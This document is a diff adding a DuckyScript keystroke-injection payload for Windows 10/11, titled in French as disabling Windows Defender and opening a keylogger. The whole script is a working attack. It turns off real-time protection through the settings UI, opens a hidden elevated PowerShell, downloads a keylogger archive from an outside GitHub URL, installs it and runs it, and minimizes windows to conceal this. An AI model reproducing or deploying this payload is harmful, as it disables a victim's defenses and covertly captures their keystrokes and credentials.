@@ -1,0 +1,85 @@
+REM Title: Désactiver Windows Defender et Ouvrir un Keylogger
+REM Author: s0_deep(v1.0)
+REM Target: Windows 10/11 (Powershell)
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING windows defe
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 100
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+
+REM Exit security settings
+DELAY 100
+WINDOWS d
+
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 150
+ENTER
+DELAY 1000
+STRING cd C:\Users\Public\Documents
+ENTER
+STRING $zipUrl = 'https://github.com/waaashed/EthicalKeylogger/archive/main.zip'
+ENTER
+DELAY 500
+STRING $zipFileName = 'EthicalKeylogger-main.zip'
+ENTER
+DELAY 500
+STRING $destinationDirectory = '.'
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri $zipUrl -OutFile $zipFileName
+ENTER
+DELAY 500
+STRING Expand-Archive -Path $zipFileName -DestinationPath $destinationDirectory
+ENTER
+DELAY 500
+STRING Rename-Item -Path (Join-Path $destinationDirectory "EthicalKeylogger-main") -NewName "EthicalKeylogger"
+ENTER
+STRING Remove-Item -Path $zipFileName
+ENTER
+STRING cd .\EthicalKeylogger\Keylogger_s0d3ep
+ENTER
+STRING pip install -r requirements.txt
+ENTER
+DELAY 5000
+STRING python keylogger.py
+ENTER
+DELAY 100
+WINDOWS d
